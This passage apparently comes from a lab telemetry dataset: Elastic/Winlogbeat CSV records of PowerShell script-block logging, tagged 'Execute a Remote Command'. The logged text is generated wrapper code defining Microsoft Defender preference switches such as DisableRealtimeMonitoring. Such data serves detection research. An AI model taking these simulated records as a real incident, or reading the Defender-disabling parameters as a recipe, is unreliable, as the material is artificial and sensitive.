          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {
          [object]$__cmdletization_value = ${SignatureFallbackOrder}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {
          [object]$__cmdletization_value = ${SharedSignaturesPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {
          [object]$__cmdletization_value = ${SignatureScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {
          [object]$__cmdletization_value = ${SignatureScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {
          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {
          [object]$__cmdletization_value = ${SignatureUpdateInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {
          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {
          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {
          [object]$__cmdletization_value = ${MeteredConnectionUpdates}
          $__cmdletization_me",14,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3343,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",bXkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.209",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (15 of 20):
thodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {
          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {
          [object]$__cmdletization_value = ${DisableDatagramProcessing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {
          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {
          [object]$__cmdletization_value = ${MAPSReporting}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {
          [object]$__cmdletization_value = ${SubmitSamplesConsent}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {
          [object]$__cmdletization_value = ${DisableAutoExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {
          [object]$__cmdletization_value = ${DisablePrivacyMode}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {
          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {
          [object]$__cmdletization_value = ${SchedulerRandomizationTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {
          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {
          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {
          [object]$__cmdletization_value = ${DisableIOAVProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {
          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {
          [object]$__cmdletization_value = ${DisableScriptScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletiza

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","thodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {
          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {
          [object]$__cmdletization_value = ${DisableDatagramProcessing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {
          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {
          [object]$__cmdletization_value = ${MAPSReporting}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {
          [object]$__cmdletization_value = ${SubmitSamplesConsent}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {
          [object]$__cmdletization_value = ${DisableAutoExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {
          [object]$__cmdletization_value = ${DisablePrivacyMode}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {
          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {
          [object]$__cmdletization_value = ${SchedulerRandomizationTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {
          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
